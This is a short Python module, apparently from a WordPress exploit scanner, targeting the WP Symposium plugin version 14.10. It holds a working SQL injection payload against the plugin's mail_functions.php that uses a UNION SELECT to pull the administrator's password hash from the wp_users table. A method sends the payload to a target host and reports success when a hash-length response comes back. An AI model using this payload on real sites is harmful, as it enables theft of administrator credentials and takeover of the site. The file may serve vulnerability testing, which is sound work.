import http.client
from ..exploitsql import ExploitSql


class Symposium(ExploitSql):
	@staticmethod
	def getname():
		return 'WP Symposium'

	@staticmethod
	def getversion():
		return '14.10'

	@staticmethod
	def getexploit():
		return '/wp-content/plugins/wp-symposium/ajax/mail_functions.php?mid=1&tray=in_deleted%20=%201%20UNION' \
			'%20(SELECT%20user_pass%20FROM%20wp_users%20WHERE%20ID=1)%20LIMIT%201,%201%20--'

	# TODO verify exploit is returning only a 34 character md5
	def exploit(self):
		name = self.getname()
		version = self.getversion()
		exploit = self.getexploit()
		connection = http.client.HTTPConnection(self.hostname)
		connection.request("POST", exploit)
		response = connection.getresponse().read()
		if len(response) == 34:
			ExploitSql.exploitfound(self, name, version, exploit)
		else:
			ExploitSql.exploitnotfound(self, name, version)